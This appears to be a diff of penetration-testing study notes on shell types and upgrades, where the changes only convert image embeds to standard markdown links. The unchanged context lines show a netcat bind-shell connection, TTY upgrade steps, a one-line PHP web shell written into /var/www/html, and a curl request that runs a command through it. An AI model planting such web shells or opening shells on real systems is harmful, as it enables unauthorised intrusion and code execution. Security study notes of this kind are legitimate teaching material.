@@ -24,7 +24,7 @@ once we have executed the bind shell command
 ```JavaScript
 nc <IP> <port>
 ```
-![[../assets/Shell Types and Upgrades/image 186.png|image 186.png]]
+![image 186.png](../assets/Shell%20Types%20and%20Upgrades/image%20186.png)
   
 ## Upgrading TTY
 ```JavaScript
@@ -35,8 +35,8 @@ fg
 [Enter]
 [Enter]
 ```
-![[../assets/Shell Types and Upgrades/image 1 139.png|image 1 139.png]]
-![[../assets/Shell Types and Upgrades/image 2 127.png|image 2 127.png]]
+![image 1 139.png](../assets/Shell%20Types%20and%20Upgrades/image%201%20139.png)
+![image 2 127.png](../assets/Shell%20Types%20and%20Upgrades/image%202%20127.png)
 - shell won’t cover the entire terminal (this is what has happened to me before)
     
     - in order to fix this, we have to modify some variables
@@ -94,4 +94,4 @@ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 ```JavaScript
 curl http://SERVER_IP:PORT/shell.php?cmd=id
 ```
-![[../assets/Shell Types and Upgrades/image 3 114.png|image 3 114.png]]
+![image 3 114.png](../assets/Shell%20Types%20and%20Upgrades/image%203%20114.png)
